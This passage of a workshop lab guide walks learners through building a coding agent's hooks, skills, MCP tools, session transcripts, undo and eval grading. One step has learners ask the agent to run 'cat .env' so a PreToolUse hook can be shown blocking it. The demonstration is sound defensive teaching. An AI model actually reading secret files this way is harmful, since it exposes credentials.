| Windows: `cp -r` fails in cmd.exe | `cp` only exists in PowerShell (as an alias) → use `xcopy /E /I examples\project\.forja playground\.forja` in cmd. |

### You're done when
- [ ] [ ] `python scripts/tasks.py test 09` → 3 passed.
- [ ] [ ] In the CLI you see `[explore]`-prefixed tool calls and `/context` barely grows after a delegated search.
- [ ] [ ] The `reviewer` profile from `.forja/agents/` is listed in the `task` tool description and can be invoked by name.

### Checkpoint
You see the subagent's tool calls prefixed `[explore]` and the main context barely grows (`/context`).

### Challenges
1. Create a `tester` subagent that can only run `python -m pytest*`.
2. Run the subagent on a smaller, faster model.

**Tests:** `tests/test_l09_subagents.py` · **Fallen behind?** `python scripts/tasks.py catchup 10`


---

## Lab 10 · Extensibility: hooks, skills and MCP

*Day 2 · 12:10–13:20*

**Goal:** Let the team extend the agent without touching its code: deterministic policy, on-demand knowledge and external tools.

### Concepts
- **Hooks = guarantees:** AGENTS.md *asks*, a hook *enforces*. Shell commands in `settings.json` that receive the event as JSON on stdin. Exit 2 blocks; exit 0 continues. It's the convention commercial agents use: what you learn here applies there.
- **Events:** `PreToolUse` (block), `PostToolUse` (feedback, e.g. a linter), `UserPromptSubmit` (filter or add context), `Stop` (don't finish until tests pass).
- **Skills = progressive disclosure:** only the catalogue (name + description) goes in the prompt; the body is loaded with the `skill` tool when needed. Portable `SKILL.md` format.
- **MCP:** servers that expose tools (issues, DB, wiki, CI). Forja starts them from `settings.json` and registers them as `mcp__server__tool`, with `exec` risk: they go through permissions.

### What you implement
| TODO | File | What |
|---|---|---|
| 10.1 | `forja/hooks.py` | matching: hooks by event and matcher |
| 10.2 | `forja/hooks.py` | run: execute and map exit codes |
| 10.3 | `forja/skills.py` | discover_skills: SKILL.md catalogue |
| 10.4 | `forja/skills.py` | skill: load the body on demand |
| 10.5 | `forja/mcp_tools.py` | mcp_tool_name: mcp__server__tool namespace |

### Before you start
- Three small files, three ideas: `forja/hooks.py` (10.1, 10.2), `forja/skills.py` (10.3, 10.4) and `forja/mcp_tools.py` (10.5). The harness (`forja/harness.py`) already calls them: `self.hooks.run("PreToolUse", {...}, tool.name)` in `gate`, `"PostToolUse"` after executing, `"UserPromptSubmit"` and `"Stop"` in `turn`; `skills.discover_skills(home/.forja/skills, root/.forja/skills)` at startup; `mcp_tool_name` inside `connect_servers`.
- Hooks API: `subprocess.run(cmd, shell=True, cwd=..., input=<json str>, capture_output=True, text=True, timeout=...)` returns a `CompletedProcess` with `returncode`, `stdout`, `stderr`; it raises `subprocess.TimeoutExpired` on timeout. `re.fullmatch(pattern, s)` matches the WHOLE string (so `edit_file|write_file` works as an alternation). With `shell=True` the shell is cmd.exe on Windows and `/bin/sh` on macOS/Linux.
- Exit-code convention (same as commercial agents): `0` = OK (stdout may be useful context), `2` = BLOCK (stderr, or stdout if empty, is the message for the model), anything else = hook error (recorded, never blocks). `HookOutcome` has `block`, `message`, `context`, `errors`.
- Skills reuse the frontmatter parsing you wrote in 09.1 (`FRONTMATTER` + `yaml.safe_load`). `catalog()` is already written: it only needs `Skill.name` and `Skill.description`.
- Look at `examples/project/.forja/settings.json` and `examples/project/.forja/hooks/*.py`: a real PreToolUse hook reads the event with `json.load(sys.stdin)` and exits 2 with a message on stderr.

### Step by step
10.1 → 10.2 (one test covers both: `test_hook_matching_and_exit_codes`; then `test_hooks_in_harness` checks the integration), then 10.5 (one line, quick win), then 10.3 → 10.4 (both checked by `test_skills`). Leave `test_mcp_end_to_end` for last: it starts a real MCP server subprocess and needs labs 02-04 working.

#### TODO 10.1 · `forja/hooks.py` · `HookRunner.matching(event: str, tool_name: str | None = None) -> list[dict]`

**What it must do:** Returns, in config order, the hook dicts from `self.config.get(event, [])` that apply. A hook WITHOUT `matcher` always applies. A hook WITH `matcher` applies only if `tool_name` is not `None` and `re.fullmatch(matcher, tool_name)` matches. Unknown event → `[]`. Test: `[h.get("matcher") for h in runner.matching("PreToolUse", "bash")] == ["bash", None]`, `len(matching("PreToolUse", "write_file")) == 2`, `matching("Stop") == []`.

**Steps:**
1. Get the list for the event with `.get(event, [])` (missing events are normal).
2. For each hook read `h.get("matcher")`.
3. No matcher → keep it.
4. Matcher but no `tool_name` (events like `Stop`/`UserPromptSubmit`) → skip it.
5. Matcher and `tool_name` → keep it only if `re.fullmatch` succeeds. Preserve the original order.

**Watch out for:**
- `re.match`/`re.search` instead of `fullmatch`: `bash` would also match `bash_tool`, and `edit_file|write_file` with `re.match` accepts prefixes. The test expects exactly 2 hooks for `write_file`.
- `self.config[event]` raises `KeyError` for events nobody configured — `matching("Stop")` must return `[]`.
- Matchers are REGEX, not globs: in settings write `mcp__issues__.*`, not `mcp__issues__*` (that is the syntax of permission rules).

<details><summary>💡 Hint 1</summary>

Three cases per hook: no matcher, matcher without tool name, matcher with tool name.

</details>

<details><summary>💡 Hint 2</summary>

`re.fullmatch(matcher, tool_name)` returns a match object or `None`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

```python
out = []
for h in self.config.get(event, []):
    matcher = h.get("matcher")
    if matcher and <no tool_name or no fullmatch>:
        continue
    out.append(h)
return out
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l10_extensions.py -k hook_matching -v
```

#### TODO 10.2 · `forja/hooks.py` · `HookRunner.run(event: str, payload: dict, tool_name: str | None = None) -> HookOutcome`

**What it must do:** Serialises `{"hook_event_name": event, "cwd": str(self.cwd), **payload}` to JSON (`ensure_ascii=False, default=str`) and sends it on stdin to EVERY matching hook (they all run, even after a block). Per hook: exit 2 → `block=True` and append `stderr` (or `stdout`, or a default text) stripped + newline to `message`; exit 0 → append non-empty `stdout` stripped to `context`; other codes → append a description to `errors`; `TimeoutExpired` → append to `errors` and continue. Use `h.get("timeout", self.timeout)`. At the end strip `message` and `context`. Tests: PreToolUse with hooks exiting 2 / 0 / 1 → `block` and `message == "no"` and `len(errors) == 1`; UserPromptSubmit printing `ctx:` + prompt → `context == "ctx:hello"`, not blocked, 1 error. In the harness (`test_hooks_in_harness`): `BLOCKED by hook` in the tool result and the Stop hook forces one more round.

**Steps:**
1. Create an empty `HookOutcome()` and build the JSON string once.
2. For each hook in `self.matching(event, tool_name)` call `subprocess.run` with `h["command"]`, `shell=True`, `cwd=self.cwd`, the JSON as `input`, `capture_output=True`, `text=True` and the timeout.
3. Wrap the call in `try/except subprocess.TimeoutExpired` → record an error, `continue`.
4. Branch on `returncode`: 2 → block + message; 0 → context if stdout has text; else → errors (include the code and a slice of stderr).
5. After the loop, `.strip()` `message` and `context` so trailing newlines don't break the exact comparisons.

**Watch out for:**
- Stopping at the first blocking hook: the test config has a third hook (exit 1) that must still run, giving `len(errors) == 1`.
- Forgetting `text=True`: `input` must then be bytes and `stdout` comes back as bytes → `TypeError` or `b'no'` != `'no'`.
- Not stripping: `message` would be `'no\n'`; the test compares with `== "no"`.
- Without `cwd=self.cwd` relative hook commands (`python .forja/hooks/x.py`) and the test's Stop hook (`pathlib.Path('DONE')`) look in the wrong folder.
- Windows: the test builds commands as `"C:/path/python.exe" -c "..."`; that only works with `shell=True` (cmd.exe parses the quotes).

<details><summary>💡 Hint 1</summary>

Run each command once with the event on stdin and look only at `returncode`, `stdout`, `stderr`.

</details>

<details><summary>💡 Hint 2</summary>

`p = subprocess.run(h["command"], shell=True, cwd=self.cwd, input=data, capture_output=True, text=True, timeout=h.get("timeout", self.timeout))`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

```python
outcome = HookOutcome()
data = json.dumps({...}, ensure_ascii=False, default=str)
for h in self.matching(event, tool_name):
    try: p = subprocess.run(...)
    except subprocess.TimeoutExpired: outcome.errors.append(...); continue
    if p.returncode == 2: ...          # block, message += stderr or stdout
    elif p.returncode == 0: ...        # context += stdout
    else: ...                          # errors
# strip message and context
return outcome
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l10_extensions.py -k hook -v
```

#### TODO 10.3 · `forja/skills.py` · `discover_skills(*folders: Path) -> dict[str, Skill]`

**What it must do:** For each folder that exists, look at `<folder>/*/SKILL.md` (sorted). Parse frontmatter; keep only files with `name` and `description`. Store `Skill(name, description_normalised, path_to_SKILL.md)` under `name`; later folders overwrite earlier ones (the harness passes user folder first, project folder second, so project wins). Normalise the description's whitespace: the test's YAML description spans two lines and must become exactly `"How to make commits here."`. A `SKILL.md` without frontmatter is skipped (`list(sk) == ["commits"]`).

**Steps:**
1. Start with an empty dict; loop over the folders in the order given and skip non-directories.
2. `sorted(folder.glob("*/SKILL.md"))` — one level of subfolders, exactly that file name.
3. Match `FRONTMATTER`; no match → skip. Load the YAML (guard against `None`).
4. Require `name` and `description`; collapse all whitespace in the description into single spaces.
5. Store `Skill(...)` with the path of the `SKILL.md` file itself (10.4 reads it again).

**Watch out for:**
- A multi-line YAML value (`description: How to make\n  commits here.`) is folded by YAML, but be explicit: `" ".join(str(d).split())` guarantees single spaces and no newline, which `catalog()` needs to produce `- commits: How to make commits here.`.
- Returning early when the first folder is missing: the user folder (`~/.forja/skills`) usually doesn't exist — skip it and keep going.
- Storing the folder instead of the `SKILL.md` path: 10.4 then fails to read the body.

<details><summary>💡 Hint 1</summary>

This is 09.1 again with a different glob and a different dataclass.

</details>

<details><summary>💡 Hint 2</summary>

`folder.glob("*/SKILL.md")`, `FRONTMATTER.match(f.read_text(encoding="utf-8"))`, `" ".join(str(meta["description"]).split())`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

```python
out = {}
for folder in folders:
    if not folder.is_dir(): continue
    for f in sorted(folder.glob(...)):
        m = ...; meta = ...            # None-safe
        if <valid>:
            out[meta["name"]] = Skill(..., ..., f)
return out
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l10_extensions.py -k skills -v
```

#### TODO 10.4 · `forja/skills.py` · `make_skill_tool(skills)` → inner tool `skill(name: str) -> str`

**What it must do:** Unknown name → `ValueError` listing the available skills (or `none`). Known name → re-read `skill.path`, strip the frontmatter, and return `# Skill: <name>`, a line with the folder (`(folder: <path.parent>)`, so the model can find scripts/templates next to `SKILL.md`), a blank line and the stripped BODY. The test checks the result contains `Use conventional commits.` and does NOT contain `---`. Do not change the docstring: it becomes the tool description and the `Args:` section documents `name`.

**Steps:**
1. Look up `skills.get(name)`; if missing, raise `ValueError` with the list of names.
2. Read the file again (the body is not cached: that is progressive disclosure).
3. Apply `FRONTMATTER.match` and keep group 2 stripped; if somehow it doesn't match, fall back to the whole text.
4. Return the header, the folder line and the body.

**Watch out for:**
- Returning the whole file: the frontmatter `---` lines leak into the result and the test fails on `"---" not in out`.
- Returning an error string instead of raising: it still "works", but the tool result is marked ok and the model can't tell it failed.
- If `test_skills` fails on `"commits" in llm.calls[0]["messages"][0]["content"]`, the catalogue is not reaching the system prompt: that needs lab 06's `build_system_prompt` to include `skills_catalog`.

<details><summary>💡 Hint 1</summary>

The catalogue (descriptions only) is already in the prompt; this tool returns the part that was left out.

</details>

<details><summary>💡 Hint 2</summary>

`m = FRONTMATTER.match(s.path.read_text(encoding="utf-8"))`; `m.group(2).strip()`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

```python
s = skills.get(name)
if s is None:
    raise ValueError(f"unknown skill: {name}. Available: ...")
body = ...    # text without frontmatter
return f"# Skill: {s.name}\n(folder: ...)\n\n{body}"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l10_extensions.py -k skills -v
```

#### TODO 10.5 · `forja/mcp_tools.py` · `mcp_tool_name(server: str, tool: str) -> str`

**What it must do:** Returns `mcp__<server>__<tool>` where every character outside `[a-zA-Z0-9_]` in server AND tool is replaced with `_` (use the precompiled `NAME_RE`). Tests: `("issues", "get_issue") -> "mcp__issues__get_issue"`, `("my-wiki", "search.docs") -> "mcp__my_wiki__search_docs"`. `connect_servers` (already written) uses it to rename every MCP tool; MCP tools get risk `exec`, so they go through permissions.

**Steps:**
1. Sanitise the server name with `NAME_RE.sub("_", ...)`.
2. Sanitise the tool name the same way.
3. Join with the `mcp__` prefix and a double underscore between them.

**Watch out for:**
- Single underscores (`mcp_issues_get_issue`): permission rules like `mcp__issues__*` in `settings.json` then never match.
- Sanitising only the tool name: a server called `my-wiki` produces an invalid tool name that some models/servers reject.

<details><summary>💡 Hint 1</summary>

One line with an f-string.

</details>

<details><summary>💡 Hint 2</summary>

`NAME_RE.sub("_", server)` replaces every forbidden character.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

```python
return f"mcp__{...}__{...}"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l10_extensions.py -k mcp -v
```

### Run
```bash
python scripts/tasks.py test 10
cp -r examples/project/.forja playground/      # if you didn't in lab 09
forja --cwd playground
> list the open issues, fix #12 and comment on the issue what you changed
> commit following the repo's convention
```

### Try it in your agent
1. Make sure `playground/.forja/` exists (copied in lab 09). The MCP server path in `settings.json` (`../examples/mcp/issues_server.py`) is resolved from the project root (`playground/`), so `forja --cwd playground` from the repo root works. If the server fails you get a startup note `· MCP 'issues': …` and no MCP tools.
2. `/tools` → you should see `mcp__issues__list_issues`, `mcp__issues__get_issue`, `mcp__issues__comment_issue` with `[exec]`, and `skill [read]`.
3. `list the open issues, fix #12 and comment on the issue what you changed`. Expected: `⏺ mcp__issues__list_issues` (no approval prompt: `mcp__issues__*` is in `allow`), reads/edits in `invoices/amounts.py`, a PostToolUse compile check after each edit, and finally `mcp__issues__comment_issue`.
4. Watch the Stop hook (`.forja/hooks/stop_tests.py`): it only runs when there are uncommitted changes in the project (git), so plain questions are not affected. If the agent edited files and says it is done while tests are red, you will see it keep working (a `[Stop hook] You are not done yet…` user message is injected with the pytest tail). It gives up after 3 extra rounds.
5. `commit following the repo's convention` → the first call should be `⏺ skill conventional-commits`, then `git status`/`git diff`, then a commit message like `fix(amounts): …`. (You will be asked to approve `git commit`: it is not in `allow`.)
6. Try the PreToolUse hook: `run cat .env` → the result shows `BLOCKED by hook: Command blocked by policy: it may expose secrets…`.

### If something goes wrong
| Symptom | Cause → fix |
|---|---|
| `test_hook_matching_and_exit_codes`: `assert out.message == 'no'` fails with `'no\n'` | You didn't strip → `.strip()` the accumulated `message`/`context` at the end. |
| `len(out.errors) == 1` fails (0 errors) | You `break` after the blocking hook, so the exit-1 hook never runs → run every matching hook. |
| `TypeError: a bytes-like object is required` in `subprocess.run` | Missing `text=True` → add it (input/stdout/stderr become `str`). |
| Windows: hook test fails with `'C:/…/python.exe' is not recognized` or quoting errors | Run without `shell=True` and cmd.exe never parses the quoted command → keep `shell=True` and pass the command as a single string. |
| Answers end with `[Stop hook] You are not done yet…` although you only asked a question | `stop_tests.py` runs the tests whenever there are uncommitted changes under `playground/` (e.g. a half-finished fix from an earlier lab) → finish the fix, or `python scripts/tasks.py reset`. Outside git it always runs. |
| No `mcp__issues__*` tools; startup note `· MCP 'issues': …` | The server failed to start → check the path is relative to the project root (`playground/`), that `mcp` is installed (`pip show mcp`), and run the server by hand: `python examples/mcp/issues_server.py`. |
| PostToolUse/PreToolUse hook never fires for MCP tools | The matcher is a regex with `fullmatch` → use `mcp__issues__.*`, not the glob `mcp__issues__*`. |
| The model never calls `skill` | Small models ignore catalogues → make the skill description say WHEN to load it ('Load it before running git commit') and mention it in the prompt. |

### You're done when
- [ ] [ ] `python scripts/tasks.py test 10` → 5 passed (including `test_mcp_end_to_end`).
- [ ] [ ] In the CLI: `cat .env` is blocked by the PreToolUse hook, and the Stop hook makes the agent continue while tests are red.
- [ ] [ ] `/tools` lists `skill` and the `mcp__issues__*` tools, and the agent loads `conventional-commits` before committing.

### Checkpoint
The Stop hook won't let it finish with red tests; the agent loads the `conventional-commits` skill before committing; `mcp__issues__*` tools show up in `/tools`.

### Challenges
1. A PostToolUse hook that runs `ruff` on the edited file.
2. Connect a real MCP server from your team.

**Tests:** `tests/test_l10_extensions.py` · **Fallen behind?** `python scripts/tasks.py catchup 11`


---

## Lab 11 · Sessions and undo

*Day 2 · 14:20–14:55*

**Goal:** Resume sessions and undo what the agent did without relying on git.

### Concepts
- **Append-only JSONL transcript:** one message per line in `.forja/sessions/`. Resume, audit and debug. After compaction, a marker with the new state.
- **Checkpoints:** before a tool modifies a file, its original content (or that it didn't exist) is saved — only the first time per turn.
- **/undo:** restores the files from the last turn with changes. Works without git and doesn't touch your commits.
- **Limit:** `bash` side effects (installing packages, `rm`) can't be undone. That's why bash goes through permissions.

### What you implement
| TODO | File | What |
|---|---|---|
| 11.1 | `forja/session.py` | Transcript.append |
| 11.2 | `forja/session.py` | Transcript.load (with compaction markers) |
| 11.3 | `forja/session.py` | Checkpoints.before_write |
| 11.4 | `forja/session.py` | Checkpoints.undo |

### Before you start
- Open `forja/session.py`. Two independent classes: `Transcript` (11.1, 11.2: a JSONL file per session in `<project>/.forja/sessions/<id>.jsonl`) and `Checkpoints` (11.3, 11.4: an in-memory stack of turns, each `{Path: original bytes | None}`). `mark_compaction` and `list_sessions` are already written: read them, they tell you the line format (`{"ts": ..., "message": m}` and `{"ts": ..., "compacted": [...]}`).
- How the harness uses them: at the end of `Forja.turn` it calls `self.transcript.append(*self.history[start:])` (only the NEW messages); `resume(id)` calls `Transcript.load(folder, id)`. `Forja.turn` calls `self.checkpoints.begin_turn()`, and `Workspace` calls `checkpoints.before_write(path)` right BEFORE `write_file`/`edit_file` touch a file (see `forja/fs_tools.py`). `/undo` calls `Checkpoints.undo()`.
- Stdlib: `json.dumps(obj, ensure_ascii=False)`, `json.loads(line)`, `Path.open("a", encoding="utf-8")` (append mode), `Path.read_bytes()` / `write_bytes()` (bytes, so encodings and line endings are restored exactly), `Path.unlink(missing_ok=True)`, `Path.mkdir(parents=True, exist_ok=True)`.
- Limit to keep in mind: only file tools create checkpoints. Whatever `bash` does (`rm`, `pip install`, `sed -i`) cannot be undone.

### Step by step
11.1 and 11.2 together (one round-trip test: `test_transcript_roundtrip`), then 11.3 and 11.4 together (`test_checkpoints`). Finish with `test_harness_resume_and_undo`, which exercises everything through the real harness (needs labs 02-04 for `edit_file` in `accept_edits`).

#### TODO 11.1 · `forja/session.py` · `Transcript.append(self, *messages: dict) -> None`

**What it must do:** Creates `self.folder` if needed, opens `self.path` in APPEND mode (UTF-8) and writes one line per message: `json.dumps({"ts": <time.time() rounded>, "message": m}, ensure_ascii=False) + "\n"`. Never rewrites earlier lines. Called several times on the same file (the test appends 2 messages, then 1 more, then a compaction marker, then 1 more).

**Steps:**
1. `self.folder.mkdir(parents=True, exist_ok=True)`.
2. Open `self.path` with mode `"a"` and `encoding="utf-8"` in a `with` block.
3. For each message write one JSON object per line with keys `ts` and `message`.

**Watch out for:**
- Mode `"w"` truncates the file: after the second `append` only the last message survives and the round-trip fails.
- Forgetting the trailing `"\n"`: two records on one line → `json.JSONDecodeError: Extra data` in `load`.
- Windows: without `encoding="utf-8"` the default codepage (cp1252) breaks on `€`, `→` or accented text in messages.
- Use the key `message` exactly: `list_sessions` (already written) reads `.get("message")`.

<details><summary>💡 Hint 1</summary>

JSON Lines = one complete JSON document per line, only ever appended.

</details>

<details><summary>💡 Hint 2</summary>

`with self.path.open("a", encoding="utf-8") as f:` then `f.write(json.dumps({...}, ensure_ascii=False) + "\n")`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

```python
self.folder.mkdir(...)
with self.path.open(...) as f:
    for m in messages:
        f.write(...)   # {'ts': ..., 'message': m} + newline
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l11_sessions.py -k transcript -v
```

#### TODO 11.2 · `forja/session.py` · `Transcript.load(folder: Path, session_id: str) -> list[dict]` (staticmethod)

**What it must do:** Reads `<folder>/<session_id>.jsonl`; if it doesn't exist raise `FileNotFoundError`. Rebuilds the history line by line: a record with `compacted` REPLACES the whole history with that list; a record with `message` is appended. Skip blank lines. Test: after `[hello, how are you, second]` + compaction `[[Summary] x]` + `continuing`, the result is `["[Summary] x", "continuing"]`. The harness test checks `app2.history == app.history` after `resume`, so messages must come back unchanged (including `tool_calls`).

**Steps:**
1. Build the path `folder / f"{session_id}.jsonl"`; raise `FileNotFoundError` if it is not a file.
2. Start with an empty list and read the file as UTF-8, line by line.
3. Skip empty lines; `json.loads` the rest.
4. If the record has `compacted` → replace the history with a copy of that list; otherwise append `record["message"]`.
5. Return the history.

**Watch out for:**
- Appending the compacted list instead of replacing: you get `hello, how are you, second, [Summary] x, continuing`.
- Checking `if "message" in rec` first and ignoring the rest silently drops compaction markers — check `compacted` first.
- A trailing empty line makes `json.loads("")` raise — skip blank lines.

<details><summary>💡 Hint 1</summary>

The file is an event log; replay it to rebuild the state.

</details>

<details><summary>💡 Hint 2</summary>

`for line in p.read_text(encoding="utf-8").splitlines():` and `rec = json.loads(line)`; branch on `"compacted" in rec`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

```python
p = folder / f"{session_id}.jsonl"
if not p.is_file(): raise FileNotFoundError(...)
history = []
for line in ...:
    if not line.strip(): continue
    rec = ...
    if "compacted" in rec: history = ...
    else: history.append(...)
return history
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l11_sessions.py -k transcript -v
```

#### TODO 11.3 · `forja/session.py` · `Checkpoints.before_write(self, path: Path) -> None`

**What it must do:** Records the ORIGINAL state of `path` in the current (last) turn of `self.stack`: `path.read_bytes()` if it exists, `None` if it doesn't. Only the FIRST time a given path is seen in that turn (later writes in the same turn must not overwrite the original). If there is no turn yet (`self.stack` empty), call `self.begin_turn()` first. Test: `a.txt` written twice in one turn must undo to `"original"`; `new.txt` created in the turn must be deleted on undo.

**Steps:**
1. If `self.stack` is empty, `self.begin_turn()`.
2. Take the current turn dict: `self.stack[-1]`.
3. If `path` is already a key, do nothing.
4. Otherwise store `path.read_bytes()` if `path.exists()`, else `None`.

**Watch out for:**
- Overwriting the stored value on every call: after `v1` → `v2` the undo would restore `v1`, not `original`.
- Storing text (`read_text`) instead of bytes: CRLF line endings on Windows and non-UTF-8 files don't round-trip exactly.
- Calling `begin_turn()` unconditionally here: every write would open a new turn and `/undo` would only revert the last write.

<details><summary>💡 Hint 1</summary>

`None` means "this file did not exist before" — undo will delete it.

</details>

<details><summary>💡 Hint 2</summary>

`turn = self.stack[-1]`; `if path not in turn: turn[path] = ...`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

```python
if not self.stack: ...
turn = self.stack[-1]
if path not in turn:
    turn[path] = ...  # bytes or None
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l11_sessions.py -k checkpoints -v
```

#### TODO 11.4 · `forja/session.py` · `Checkpoints.undo(self) -> list[Path]`

**What it must do:** Discards EMPTY turns from the top of the stack (turns where nothing was written), then pops the last non-empty turn and restores every file in it: original bytes → write them back (creating parent folders); `None` → delete the file (no error if already gone). Returns the restored paths SORTED. Nothing to undo → `[]`. Test: an empty turn on top is skipped, both files are restored, and a second `undo()` returns `[]`. The CLI's `/undo` prints `restored: <paths>` or `nothing to undo`.

**Steps:**
1. While the stack is not empty and its last turn is empty, pop it.
2. If the stack is now empty, return `[]`.
3. Pop the last turn.
4. For each `(path, original)`: if `original is None` → `unlink(missing_ok=True)`; else `mkdir` the parent and `write_bytes(original)`.
5. Return `sorted(...)` of the turn's paths.

**Watch out for:**
- Not skipping empty turns: the harness calls `begin_turn()` on EVERY turn, so a question after an edit would make `/undo` say 'nothing to undo'.
- Peeking (`self.stack[-1]`) instead of popping: a second `undo()` would restore the same turn again instead of returning `[]`.
- Writing back a file whose folder was deleted meanwhile → `FileNotFoundError`; create parents first.

<details><summary>💡 Hint 1</summary>

Think of the stack as a list of snapshots of only the files each turn touched.

</details>

<details><summary>💡 Hint 2</summary>

`while self.stack and not self.stack[-1]: self.stack.pop()`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

```python
# drop empty turns from the end
if not self.stack: return []
turn = self.stack.pop()
for path, original in turn.items():
    if original is None: ...   # delete
    else: ...                  # mkdir parent + write bytes
return sorted(turn)
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l11_sessions.py -k "checkpoints or resume_and_undo" -v
```

### Run
```bash
python scripts/tasks.py test 11
forja --cwd playground --mode accept_edits
> change the default due-date period to 60 days
/undo
/sessions
forja --cwd playground --resume <id>
```

### Try it in your agent
1. `forja --cwd playground --mode accept_edits` and type `change the default due-date period to 60 days`. Expected: an `edit_file invoices/dates.py` with a diff panel (`days: int = 30` → `60`), no approval prompt (accept_edits).
2. `/undo` → `restored: invoices/dates.py`. Check the file: it says `30` again. `/undo` once more → `nothing to undo`.
3. Ask a plain question (`what does due_date do?`), make another edit, ask another question, then `/undo`: it still reverts the last turn WITH changes (empty turns are skipped).
4. `/sessions` → lines like `20261103-143012-a1b2  change the default due-date period to 60 days`. Look at the raw file: macOS/Linux `cat playground/.forja/sessions/<id>.jsonl` · PowerShell `Get-Content playground\.forja\sessions\<id>.jsonl` — one JSON object per line.
5. `/exit`, then `forja --cwd playground --resume <id>` and ask `what did you change before?` → the agent answers from the restored history.
6. Note what is NOT undone: ask the agent to `create a file tmp.txt using bash` and `/undo` → `tmp.txt` is still there (`/undo` says `nothing to undo`, or reverts an OLDER edit turn instead). Clean up with `python scripts/tasks.py reset` if needed.

### If something goes wrong
| Symptom | Cause → fix |
|---|---|
| `json.decoder.JSONDecodeError: Extra data` in `load` | Two records on the same line → add `"\n"` after each `json.dumps` in `append`. |
| Round-trip returns only the last message | You opened the file with `"w"` → use append mode `"a"`. |
| `test_checkpoints`: `a.txt` restores to `v1` instead of `original` | `before_write` overwrites the stored original → only store it the first time the path appears in the turn. |
| `/undo` always says `nothing to undo` after a follow-up question | Empty turns on top of the stack are not skipped → pop empty turns before popping the real one. |
| `test_harness_resume_and_undo`: `app2.history == app.history` fails | Messages are being changed on the way (e.g. you saved `str(m)` or only `content`) → dump the whole dict as JSON and load it back unchanged. |
| `UnicodeEncodeError` / garbled text in `.jsonl` on Windows | Default codepage is not UTF-8 → pass `encoding="utf-8"` when opening and reading, keep `ensure_ascii=False`. |
| `--resume` says the session does not exist | Sessions live in `<project>/.forja/sessions/` → resume with the same `--cwd` you used when creating it, and copy the id from `/sessions`. |

### You're done when
- [ ] [ ] `python scripts/tasks.py test 11` → 3 passed.
- [ ] [ ] `/undo` restores a file edited by the agent and deletes a file it created, without git.
- [ ] [ ] `forja --cwd playground --resume <id>` continues the previous conversation.

### Checkpoint
`/undo` restores the file and `--resume` continues the previous conversation.

### Challenges
1. `/undo N` to undo several turns.
2. `/rewind`: undo files AND roll history back to the same point.

**Tests:** `tests/test_l11_sessions.py` · **Fallen behind?** `python scripts/tasks.py catchup 12`


---

## Lab 12 · Evals: measure your agent

*Day 2 · 14:55–16:00*

**Goal:** Compare models and harness changes with real tasks and objective checks.

### Concepts
- **Without measuring, it's all opinion.** Is `qwen3-coder:30b` better than `qwen3:8b`? Does your new prompt help? Measure it.
- **Task = prompt + objective check** on a CLEAN COPY of the project: tests (`command`), HIDDEN tests copied afterwards (`hidden`, so it can't cheat), answer content (`answer_contains`) and changing nothing (`forbid_changes`).
- **Headless + bypass inside the copy:** the sandbox is the temp folder.
- **Several repetitions:** models aren't deterministic. Look at pass rate, steps, time and tokens.

### What you implement
| TODO | File | What |
|---|---|---|
| 12.1 | `forja/evals.py` | grade: apply the checks |
| 12.2 | `forja/evals.py` | summarize: pass rate, per task, steps, time, tokens |

### Before you start
- Open `forja/evals.py` (your TODOs: `grade` and `summarize`) and `evals/tasks.yaml` (the tasks). Already written for you: `load_tasks`, `snapshot(root)` (dict `relative path -> sha1`, ignoring `.forja`, `.git`, `__pycache__`, `.pytest_cache`), `norm(s)` (lowercase + strip accents) and `run_task`, which copies `playground/` into a temp dir, runs ONE headless turn in `bypass` mode, then calls your `grade(task, work, answer, before, repo_root)`.
- The runner is `evals/run_evals.py` (via `python scripts/tasks.py evals ...`): flags `--model`, `--backend`, `--repeat N`, `--only <id>`, `--max-steps`, `--config <.forja folder>` (use your settings, hooks, skills and subagents in every task), `--mcp` and `--label <suffix>` for the report name. It prints one `PASS`/`FAIL` line per run, calls your `summarize` and writes `out/evals_<model>.json` (`/` and `:` in the model name become `_`).
- Stdlib: `subprocess.run(cmd, shell=True, cwd=workdir, capture_output=True, text=True, timeout=...)` and `subprocess.TimeoutExpired`; `shutil.copy(src, dst)`; `statistics.mean`; `dataclasses.asdict`. `TaskResult` fields: `id, passed, reason, steps, tool_calls, tokens, seconds, stop_reason, answer`.
- A task's `check` dict may contain: `command` (exit 0 = pass, optional `timeout`, default 120 s), `hidden` (`{repo-relative source: workdir-relative destination}`, copied AFTER the agent finished), `answer_contains` (list of strings), `forbid_changes` (bool).
- Evals use YOUR whole agent (labs 01-11). `test_run_task_pass_and_fail` drives `read_file`, `edit_file` and `bash` through the harness, so those labs must pass.

### Step by step
12.1 first (`test_grade_answer_and_forbid_changes`, `test_hidden_tests_copied_after`, then `test_run_task_pass_and_fail`), because `run_task` and the runner depend on it. 12.2 is independent arithmetic (`test_summarize`). Then run real evals: start with `--only vat_question` (fast, read-only).

#### TODO 12.1 · `forja/evals.py` · `grade(task, workdir, answer, before, repo_root) -> tuple[bool, str]`

**What it must do:** Applies the checks in THIS order and returns at the first failure: (1) `forbid_changes` and `snapshot(workdir) != before` → `(False, <reason containing 'modified'>)`; (2) `answer_contains`: every string, compared with `norm()` on both sides, must be in the answer, else `(False, <reason listing the missing ones>)`; (3) copy each `hidden` file from `repo_root / src` to `workdir / dst` (create parent folders); (4) if `command`: run it in `workdir` with `shell=True`; timeout → `(False, ...)`; non-zero exit → `(False, <reason containing 'failed'> + the last 3 lines of stdout+stderr)`. All good → exactly `(True, "ok")` (the test compares the tuple).

**Steps:**
1. Read `chk = task.check`.
2. If `chk.get("forbid_changes")` and the current snapshot differs from `before`, fail with a 'modified files…' reason.
